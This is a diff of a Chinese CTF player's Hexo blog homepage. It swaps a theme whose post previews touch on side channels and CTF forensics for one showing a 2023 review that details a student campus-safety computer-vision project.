@@ -1,228 +1,838 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>h3110w0r1d's Blog - we can be what we are willing to be</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
-<meta property="og:type" content="website">
-<meta property="og:title" content="h3110w0r1d&#39;s Blog">
-<meta property="og:url" content="http://dezhoutorizhao.github.io/index.html">
-<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
-<meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
-<meta property="article:author" content="h3110w0r1d">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'h3110w0r1d\'s Blog',
-  isPost: false,
-  isHome: true,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2024-01-15 13:48:17'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
     
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
-
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
-
-        document.head.appendChild(script)
-      })
+        <meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
+
+    <!--Author-->
     
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+        <meta name="author" content="h3110w0r1d">
     
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
+
+    <!--Open Graph Title-->
     
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">h3110w0r1d's Blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></span></div><div class="content">2023复盘总结
-  2023年很曲折，经历了很多挫折，有很多不愉快的事情，但是也有一些高光时刻
-  在竞赛和项目中认识了很多老师和行业大牛，我认为这将是非常重要的资源
-  竞赛中小有成就，拿到了四个国奖和若干个省奖
-  第一年搬出宿舍校外住宿，算了算一年的科创奖金差不多可以完全承担一年的房租，还有剩余
-  全国各地到处跑，见识到了大千世界
+        <meta property="og:title" content="h3110w0r1d&#39;s Blog"/>
+    
 
-开发项目
-  “先有开发，后有安全”
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全" />
+    
 
-  和一起打了将近两年CTF的队友一起组队搞开发，彼此之间配合还算比较好，没有出现推诿扯皮之类的意外情况，这次项目经历也算进一步巩固了我们之间的关系
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="h3110w0r1d&#39;s Blog"/>
 
-  很荣幸能够认识刘老师，我们在开发过程中遇到的一些解决不了的问题经常会请教他，他总是能够给出一些超出我们知识范围的想法，不会直接教给我们，而是让我们自己想办法去实现，我感觉这很好，很锻炼发现问题、提出问题、分析问题、解决问题的能力
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
 
-  最后的结果还是比较满意的，这些开发项目拿到了中国大学生计算机设计大赛国家级二等奖一项、国家级三等奖一项、省奖若干，中国大学生服务外包创新创业大赛区域赛三等奖、中国机器人及人工智能大赛山东赛区三等奖，这个寒假打算去申请专利和 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="content">RSA侧信道攻击原理
-  能量分析攻击（侧信道攻击）是一种能够从密码设备中获取秘密信息的密码攻击方法．
-  与其 他攻击方法不同：这种攻击利用的是密码设备的能量消耗特征，而非密码算法的数学特性．
-  能量分析攻击是一种非入侵式攻击，攻击者可以方便地购买实施攻击所需要的设备：所以这种攻击对智能卡之类的密码设备的安全性造成了严重威胁。
+    <!--Page Cover-->
+    
 
-攻击条件
-  攻击者可获取与加解密相关的侧信道信息，例如能量消耗、运算时间、电磁辐射等等。
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
 
-例子
-  
-  
+    <!-- Title -->
+    
+    <title>h3110w0r1d&#39;s Blog</title>
 
-转载题目
-  36c3 Web 学习记录 (zeddyu.info)
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
 
-</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" title="蓝帽杯半决赛wp_电子取证部分">蓝帽杯半决赛wp_电子取证部分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-09-16T13:26:55.732Z" title="发表于 2023-09-16 21:26:55">2023-09-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">大王毕盛——电子取证取证1
-  检材数据开始提取是今年什么时候？
-  在logs.txt中，直接找到时间：09-11 17:20
-  
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
 
-取证2
-  嫌疑人手机SD卡存储空间一共多少GB？（答案格式： 22.5）
-  logs.txt中显示SD卡总空间24.32GB
-  
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
 
-取证3
-  嫌疑人手机设备名称是？（答案格式：adfer）
-  设备名称：sailfish
-  
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
 
-取证4
-  嫌疑人手机IMEI是？（答案格式：3843487568726387）
-  取证软件导入华为备份文件夹检材后找到IMEI：352531082716257
-  
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-取证5
-  嫌疑人手机通讯录数据存放在那个数据库文件中？（答案格式：call.db）
-  在所有数据库文件中搜索到contacts.db
-  
 
-取证6
-  嫌疑人手机一共使用过多少个应用？（答案格式：22）
-  在日志中看到一共使用过100个应用，填的100
+    <!-- Google Analytics -->
+    
 
-取证7
-  测试apk的包名是？（答案格式：con.tencent.com）
-  取证软件中看到apk目录安装名
-  
 
-取证8
-  测试apk的签名算法是？（答案格式:AES250）
-  ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/" title="蓝帽杯半决赛wp_web部分">蓝帽杯半决赛wp_web部分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-09-16T13:18:03.466Z" title="发表于 2023-09-16 21:18:03">2023-09-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">ArticleShare
-  在前端代码中得知：side channel attack
+<meta name="generator" content="Hexo 5.4.0"></head>
 
-  exp如下
 
-```  import requests  import time  import sys
-  def main(host, port):
-  s = requests.Session()
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">h3110w0r1d's Blog</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2023%E5%A4%8D%E7%9B%98/">
+                2023复盘
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2024-01-11</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/2023%E5%A4%8D%E7%9B%98/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="2023复盘"><a href="#2023复盘" class="headerlink" title="2023复盘"></a>2023复盘</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>  2023年很曲折，经历了很多挫折，有很多不愉快的事情，但是也有一些高光时刻</li>
+<li>  在竞赛和项目中认识了很多老师和行业大牛，我认为这将是非常重要的资源</li>
+<li>  竞赛中小有成就，拿到了四个国奖和若干个省奖</li>
+<li>  第一年搬出宿舍校外住宿，算了算一年的科创奖金差不多可以完全承担一年的房租，还有剩余</li>
+<li>  全国各地到处跑，见识到了大千世界</li>
+</ol>
+<h2 id="开发项目"><a href="#开发项目" class="headerlink" title="开发项目"></a>开发项目</h2><ol>
+<li><p>  “先有开发，后有安全”</p>
+</li>
+<li><p>  和一起打了将近两年CTF的队友一起组队搞开发，彼此之间配合还算比较好，没有出现推诿扯皮之类的意外情况，这次项目经历也算进一步巩固了我们之间的关系</p>
+</li>
+<li><p>  很荣幸能够认识刘老师，我们在开发过程中遇到的一些解决不了的问题经常会请教他，他总是能够给出一些超出我们知识范围的想法，不会直接教给我们，而是让我们自己想办法去实现，我感觉这很好，很锻炼发现问题、提出问题、分析问题、解决问题的能力</p>
+</li>
+<li><p>  最后的结果还是比较满意的，这些开发项目拿到了中国大学生计算机设计大赛国家级二等奖一项、国家级三等奖一项、省奖若干，中国大学生服务外包创新创业大赛区域赛三等奖、中国机器人及人工智能大赛山东赛区三等奖，这个寒假打算去申请专利和软著</p>
+</li>
+<li><p>  中国大学生服务外包创新创业大赛和中国机器人及人工智能大赛是命题赛，给出项目的所有需求，需要全部实现</p>
+</li>
+<li><p>  中国大学生计算机设计大赛是非命题赛，我们实现了很多天马行空的想法（符合正常业务的天马行空的想法，嘿嘿…）</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/dc02787f5892893228b41ab4b74e9e2.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/553204a7793e2ed1f2efdcc463fe03d.jpg"></p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/96e69e033a2100648d0a17b3c7e13aa.jpg"></p>
+</li>
+<li><p>  我们做的最好的项目是一个CV项目，拿到了中国大学生计算机设计大赛国二，具体实现功能如下</p>
+</li>
+</ol>
+<pre><code> ### 具体功能
+
+ **(1)** ***\*支持边缘防护、明火烟雾检测、围栏翻越检测、挥手/抽烟/跌倒的行为检测、积水及渗漏水检测等校园安全相关场景:\****
+
+ 针对不同的校园安全问题，算法端整理与搜寻相应的图片与视频资料，大部分图片与视频为多行为资料。针对这些资料，通过人工标注方法标注数据集，从而使得模型能够通过对不同状况的对比检测准确检测出指定目标。
+
+ 对于数据集的训练，使用基于BoTNet神经网络的优化yolov5算法进行多轮训练，首先通过对通用数据集进行训练得到上游模型，再通过对监控录像数据集进行下游训练得到最终模型，该方法能够有效提高模型在学校场所的适用性。
+
+ **(2)** ***\*对于围栏翻越检测、边缘防护等需要设定检测区域的场景支持良好的交互配置方式:\****
+
+ 针对围栏翻越检测、边缘防护等需要设定检测区域的检测任务，项目允许用户针对围栏区域与边缘防护区域在对应摄像头的交互界面进行针对性标记，并选择对应的检测模块进行检测，同时支持用户自定义检测置信度。
+
+ 这样的交互配置方式能够让用户更加方便地对特定区域进行针对性标记，并且根据实际需求选择对应的检测模块，从而提高检测的准确率。此外，支持用户自定义检测置信度也能够让用户更加灵活地控制检测结果的输出，进一步提高检测的可靠性和可用性。
+
+ **(3)** ***\*在系统中对于所识别的事件在列表中进行展示，需要包含告警事件所产生的区域、时间、内容及所记录的摄像头；点击查看按钮可以查看事件的详细内容，包括视频及图片数据；支持按不同属性筛选事件:\****
+
+ 前端的控制台页面通过对视频流进行实时播放，实现了管理人员可以实时检测当前任意摄像头的实时状况，同时在控制台页面也可以实时显示报警的信息，包括报警的图片，报警的位置，报警的类型，写有专门的接口实时的推送公众号进行处理。
+
+ **(4)** ***\*支持对所识别到的违规事件进行告警，单次告警以事件为单位；支持推送信息至指定人员或公众号；支持优化报警频率:\****
+
+ 后端使用gin-web框架通过处理HTTP请求，实现了推送信息至公众号。首先，To_weixin函数接收前端处理的POST请求，调用微信API向微信公众号发送消息。然后，调用Get_token和Get_openid函数通过发送Get请求，请求API来获得访问令牌和关注公众号的用户ID列表。最后，解析前端传来的JSON，并将其解析为Weixin_Results结构，构造消息发送到WeChat组，使用WeChat官方API将消息发送给所有关注公众号的用户。使用此方法，降低了服务器压力，充分地提高了资源利用率，实现了低时延报警推送公众号。
+
+ 对于项目的报警频率优化，算法端将每次告警以事件为单位，只有当同一事件被多次检测到时才会触发告警。这种方式能够避免由于随机噪声等因素导致的虚警，同时也能够减少同一事件被重复告警的情况。
+
+ 同时，项目支持根据用户的需要自定义告警频率，用户可以根据实际情况设置告警的时间间隔和告警次数。例如，在某些场景下用户需要及时获得每一个违规事件的告警，可以设置短时间间隔和高频告警；而在一些较为宽松的场景下则可以设置较长的时间间隔和低频告警。
+
+ **(5)** ***\*支持处置报警事件，未处置的报警高亮提示，已处置的报警可记录处置情况:\****
+
+ 控制台页面提供专门的日志菜单栏，可以显示所有已处理的报警的详细信息，报警菜单栏可以对未处理的事件进行显示，提醒管理员处理。
+
+ **(6)** ***\*系统可接入模拟现场的测试视频流，可以完成测试操作并直观显示业务结果:\****
+
+ 后端使用Go语言的Gin框架和GStreamer，通过gst-launch-1.0工具，实现了从接入模拟现场的测试RTSP视频流中提取H.264编码的视频数据，将其解码后，使用flvmux元素封装为FLV格式的视频文件，并将其保存在磁盘内，并将生成的FLV文件作为HTTP响应的内容类型，设置HTTP响应头为“video/x-flv”，将其传输给客户端。通过使用FFmpeg和GStreamer这两个多媒体框架，低资源占用率的条件下实现了视频的解码、编码、转换等操作；在同一个函数中并发地实现了客户选中的8个重点地区的rtsp视频流到flv格式文件的转换，实现了业务的灵活组合配置，可以适应不同项目的需求。
+
+ **(7)** ***\*支持模型服务的二进制封装和灵活组合，可配置为高并发低时延、高资源利用率等多种模型服务方式适应不同项目需求:\****
+
+ 后端接收前端不同类型任务的灵活组合，并将任务需求添加到数据库中。使用goroutine和sync包中的WaitGroup来实现轻量级高并发，实现了模型服务的低时延，充分地提高了资源的利用率。遍历从数据库中检索到的所有摄像头记录，并为每个摄像头创建一个goroutine线程来调用编写的Judge函数进行处理。实现了并发处理多个摄像头的数据，提高了运行的效率。
+
+  使用了sync.WaitGroup的Add方法来增加计数器，表示要等待的goroutine数量。每个goroutine在处理完毕后都会调用WaitGroup的Done方法来减少计数器的值，表示已完成一个goroutine的处理。使用WaitGroup的Wait方法可以阻塞程序，直到计数器的值为0，即所有goroutine都已完成处理。
+
+  在每个goroutine线程内部，使用了defer语句来确保在函数执行结束后调用WaitGroup的Done方法，以便适当地更新计数器的值。
+
+ 对于多个线程之间存在的共享内存竞争，使用了读写锁、互斥锁等来对多线程的共享数据来进行限制，实现了数据的一致性。
+
+ **(8)** ***\*支持模型服务的二进制封装和灵活组合配置，适应不同项目需求，方便模型更新及功能扩展需求:\****
+
+ 使用Docker这一支持二进制封装和灵活配置的框架，可以将封装好的模型镜像文件部署在不同的环境中，通过将模型封装为镜像文件并进行灵活组合配置，实现了可以方便地进行模型更新和功能拓展需求，具有更好的可移植性和拓展性。
+
+  使用Kubernetes进行模型服务的管理和部署，其提供的可拓展容器编排平台，实现了自动化部署、拓展和管理容器应用，实现了均衡负载的功能。
+
+ **(9)** ***\*支持训练过程自动化、规范化，实现对不同模型的数据处理、模型训练、评测、量化等不同功能进行灵活组合和保存，支持快速且仅进行必要计算的重复训练，以支撑更多部署场景（如增加新的学校需补充新数据进行训练等）:\****
+
+ 对于训练过程的自动化、规范化，项目的模型训练算法已经与数据预处理功能进行结合，并使用 BoTNet网络架构优化 YOLOv5 算法。BoTNet网络架构基于 MobileNetv3 和 efficientNet 的结构设计，可以在保持优异性能的同时，大幅减少模型的计算量和内存占用，使得模型训练的精度与速度相较于原本单一的yolov5算法进一步提升。同时，得益于yolov5算法的便捷性，用户只需传入标记好的数据集，并指定阈值进行训练，而无需进行多余操作，实现了训练过程的自动化、规范化，同时也使得项目支持用户进行快速且进行必要计算的重复训练，使得项目能够支撑更多的部署场景，允许用户补充数据进行统一训练。
+
+ 其次，对于不同模型的数据处理、训练、评测、量化等功能，go语言后端采取并行执行策略，允许多路模型同时运行，实现了针对不同模型进行单独的数据处理、训练、评测与量化。对于每路模型的评测与量化方面，项目对每路模型都采用了统一的评测与量化标准，通过使用交叉验证方法以及计算模型的精度、召回率与F1-score，进行综合性的评测与分析，从而保证模型的效果。
+
+ **(10)** ***\*支持完善的监控和日志，便于观测系统的性能和资源使用:\****
+
+ 后端保存了每一条算法端实时返回的检测数据，低延时地添加到数据库中，作为返回给前端的日志内容。将检测数据添加到数据库使用原生SQL语句，使项目具有更高的灵活性、更好的可控性和更好的可移植性，可以更方便地移植到其它的数据库系统中，更简单地控制查询的执行计划和优化，确保了SQL语句的执行效率和性能，实现了检测数据实时地插入日志。
+
+ 后端使用了Go语言的Gin框架和runtime包，实现了快速、高性能的CPU监测功能与获取当前程序的内存使用情况功能，将其以JSON格式返回给客户端。通过runtime包中的函数获取当前的CPU核心数与对内存使用情况的监测，并使用time包中的函数计算CPU使用情况。然后代码将结果封装成CPUUsage与MemUsage结构体，将其转换为JSON格式返回给前端。这对于检测系统的性能和资源使用非常重要，充分地体现了使用Go语言原生的内存管理机制的优势，可以帮助开发人员有效地避免常见的内存错误，便于观测系统的性能和资源使用情况。
+
+ **(11)** ***\*系统具有良好的性能、功耗表现和可扩展性和成本优势，可支撑区县级数量规模的学校的接入:\****
+
+ 首先，系统具备完整的性能测试方案和监控策略，能够针对系统的性能指标进行分析判断，用Golang编写性能测试程序，通过模拟大量并发调用算法端脚本，测试并对系统进行调优。其次，系统资源占用率低，在同样的硬件条件下功耗低的优点，降低了系统搭建成本，具有成本优势。最后，系统具有可拓展性的后端架构，支持垂直拓展和水平拓展，能够支持县级数量规模的业务。
+
+ **(12)** ***\*通过人工智能支持对人员探出围栏的状态进行识别:\****
+
+ **①** ***\*围栏防护区域定义为，有围栏且围栏区域超过人员腰部区域；\****
+
+ **②** ***\*以人员身体腹部为准，腹部超出围栏内侧视为探出，并进行告警；\****
+
+ **③** ***\*计算探出以围栏外侧边为准线，超出围栏内侧边即视为探出\****
+
+ 针对人员探出围栏的状态，项目通过对应数据集的训练，使得算法端能够大致检测到人员探出围栏这一行为，同时也能够获取围栏大致范围与人员状态信息，从而进行对比，进而辅助判断。
+
+ 具体而言，当算法端检测到有人员出现在围栏内部时，可以通过对围栏的边界进行检测并确定围栏的位置和大小，进而给出该人员距离围栏的距离和方向信息。在算法判断人员是否探出围栏时，可以通过将围栏范围与人员位置信息进行对比，进一步确定人员是否已经探出围栏。同时，还可以通过对人员状态信息的分析和比对，判断人员是否有异常行为或异常状态，进一步加强围栏安全管理。
+
+ **(13)** ***\*通过人工智能提供对于人员待在危险区域时间过长进行识别\****
+
+ **①** ***\*边缘防护区域指定为无围栏或围栏高度不超过成年人腰部的区域；\****
+
+ **②** ***\*对于边缘防护区域以人员出现在该区域时间进行告警；\****
+
+ **③** ***\*人员停留x秒后产生告警，x的具体值可配置。\****
+
+ 对于危险区域或其它限制区域，算法端提供了对于该区域的人员检测功能，用户可以在该区域摄像头对应的交互项中选择对应的模型并设置指定阈值，当该区域出现人时，，该功能将会自动检测并统计该人员在该区域内的停留时间长度，进一步提供对于人员待在危险区域时间过长进行识别和预警的服务。
+
+ 该功能的实现需要使用人工智能技术中的目标检测和计时统计等算法。通过对该区域中的摄像头拍摄到的画面进行分析，可以识别出人员在该区域的位置和活动。同时，通过对检测到的人员在该区域内的停留时间进行计时，可以判断人员待在该区域的时间是否超过了规定的阈值。
+
+ 在实际应用中，用户可以根据自己的需求选择不同的模型和阈值进行设置，并且可以通过系统提供的管理界面直观地查看该区域内人员的活动情况以及超时预警信息。这样，用户可以及时采取相应的措施，保证区域内人员的安全。
+
+ **(14)** ***\*通过人工智能提供对挥手、抽烟、跌倒行为进行识别:\****
+
+ **①** ***\*对人员挥手、抽烟、跌倒等行为进行识别；\****
+
+ **②** ***\*可以应用于人员密集区域，在人员密集区域保持识别效率。\****
+
+ 对于挥手、抽烟、跌倒行为，项目通过多种渠道获取不同场景、环境、角度、状态以及部分特殊状态的挥手、抽烟、跌倒行为图片，并采取人工标注方式标注数据集。在标注过程中，针对某一指定行为图片，进行多行为标记，从而保证目标对象的准确性。
+
+ 除此以外，在模型训练中，项目使用了多轮训练技术，这也是提高模型准确率的一个重要步骤。通过标注后的一般图片进行训练获取上游模型，再针对于学校中监控视角图片进行下游训练，从而提高模型的适用性。这样可以进一步提高模型的准确性，并使其更好地适应不同的场景和环境。
+
+ **(15)** ***\*通过人工智能提供对路面积水、墙面房顶渗漏水进行识别:\****
+
+ **①** ***\*可识别雨天路面积水情况，对于严重积水进行告警；\****
+
+ **②** ***\*可识别机房等房屋墙壁上的渗水情况并进行告警。\****
+
+ 对于路面积水、墙面房顶渗漏水的识别，项目以yolov5算法为基础，对拍摄到的路面、墙面等部位的图像进行分析和处理。通过对图片中的色彩、纹理、形状等特征进行提取和分析，从而能够准确判断积水与房顶渗漏水存在情况。
+
+ 同时，为了提高识别的准确性，算法端预留了与传感器结合的方法。允许用户接入传感器，获取对应区域的温度、湿度等信息，从而辅助目标检测算法进行对应状况的检测。
+
+ **(16)** ***\*基于K8s和微服务架构，提供良好的容器封装和高性能的接口调用，支持在K8s集群完成部署:\****
+
+ 本系统采用微服务的架构分别将前端，后端，视频流转换，数据库部署到k8s集群，其中前端提供了友好的人机交互界面，通过算法优化减轻了对后端的数据访问频率，前端封装完善，只需要提供数据库后端ip与视频流转换ip即可实现部署，后端采用GO语言可以实现高并发的调用模型进行检测与处理，后端同样封装完善，只需要提供数据库的ip与端口即可，视频流转换，采用node.js通过异步编程，实现对rtsp流转换的高并发处理，与实时响应。数据库采用mysql数据库,通过将数据库单独部署的方式保证了数据库的稳定性，同时也提供容器卷挂载到本地的方式，通过nfs实现数据的互联互通。
+
+ ### 项目分工
+
